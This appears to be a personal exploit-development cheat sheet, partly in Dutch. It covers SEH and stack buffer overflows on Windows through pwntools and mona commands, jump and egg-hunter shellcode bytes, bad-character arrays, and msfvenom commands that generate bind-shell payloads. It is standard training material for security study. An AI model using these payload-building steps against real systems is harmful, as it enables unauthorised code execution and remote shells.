### PWN TOOLS pattern create:
```
cyclic 6000
cyclic -l 0x6D616169
```

### Mona pattern_create
```
!mona pc 2500 # lengte van de pattern
Mona pattern_offset
!mona po 42326742 # waarde van EIP
Mona vindt pop pop ret
!mona seh 
!mona seh -cpb '\x00'
Mona egg hunter
!mona egg -t "w00t"
!mona find -type asc -s "w00t"
Jump over nSEH
b"\xeb\x06\x90\x90" # JMP 6 bytes forward

0x00 tot 7F = 0 - 128 vooruit 
0x80 tot FF = 0 - 128 achteruit MAAR ANDERSOM
```
dus 0xFF 1 byte backwards and 0x80 = 128 bytes back


Conditional Jump die altijd waar is over (nSEH)
```
\x75\x08         ; JNZ SHORT [+0x10] = Jump if ZF is not 0
\x74\x06         ; JZ SHORT [+0x8] = Jump if ZF is 0
```

Als je een heel stuk terug wil springen in je buffer kun je de volgende shellcode gebruiken, deze springt 786 bytes terug (let op wel SEH en nSEH er voor uiteraard):
```
"\x59\x59\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1"   # 11 bytes, pop ecx * 3, dec ch (take 256 from ecx) * 3, jmp ecx
```

The code is shown below, and works based on the fact that after taking the original POP, POP, RETN to jump into the four byte space before the SEH Overwrite, another pointer to the same memory location exists three places down on the stack. We basically get this memory address into the ECX register, decrement the CH register by 1 three times (which has the affect of decreasing ECX by a total of 768 or three times 256 since CH represents the second least significant byte of ECX), and then JUMP to ECX. This moves us back 768 bytes from the location where the original POP, POP, RETN instruction lands, and gives us more than enough space to use most Windows shellcode. At 11 bytes it is also very compact and will fit into very small buffer areas.
```
"\x59\x59\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1"
```
```
11 bytes
POP ECX \x59
POP ECX \x59
POP ECX \x59
DEC CH \xfe\xcd
DEC CH \xfe\xcd
DEC CH \xfe\xcd
JMP ECX \xff\xe1
```



Bad chars:
```
• 0x00 – is a common string terminator. 
• 0x0a, 0x0d – carriage returns, and line feeds might often be treated as line terminators, especially in software that makes use of HTTP or FTP protocols. 
• 0xff – this byte is often interpreted as EOF (End Of File) .
```

jmp esp zonder mem adres beginnende met 00
```
!mona jmp -r esp -cpb '\x00'
```

“Each time a POP <register> occurs, ESP is moved towards higher addresses by one position (1 position = 4 bytes for a 32-bit architecture). 
 Each time a RET occurs, the contents of the address ESP points at are put in EIP and executed (also ESP is moved, but this is not important here).”

Short jumps
https://thestarman.pcministry.com/asm/2bytejumps.htm

Bind shell
```
msfvenom -p windows/shell_bind_tcp LPORT=12345 -f python -v shellcode -b '\x00' EXITFUNC=thread
nc -vn 127.0.0.1 12345
msfvenom -p windows/shell_bind_tcp LPORT=443 LHOST=192.168.178.31 -f python -v shellcode -b '\x00\x0a\x0d\x20\x25' EXITFUNC=thread
```
  
Mona create bytearray
```
!mona ba -cpb '\x00\x0a\x0d\x20\x25'
  
bad_chars  = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
bad_chars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
bad_chars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
bad_chars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
bad_chars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
bad_chars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
bad_chars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
bad_chars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Mona compare
```
!mona compare -f bytearray.bin -a [address where array begins]
!mona compare -f bytearray.bin -a 0180f960
```

 Set a breakpoint on all current SEH Handler function pointers
```
!mona bpseh
```
 
PWN tools
```
from pwn import asm

asm('mov eax, 0') # => '\xb8\x00\x00\x00\x00'
```
 
Truuk voor bijv null byes, wellicht handig
```   
0x00636578 # (\x00cex) 
+ 0x01010101 # Deze tellen er bij op
-------------------------
   0x01646679
```

in assembly dus:
``` 
mov reg, 0x01646676
sub  reg, 0x01010101
push reg # nu staat ie op de stack met de null ;)
```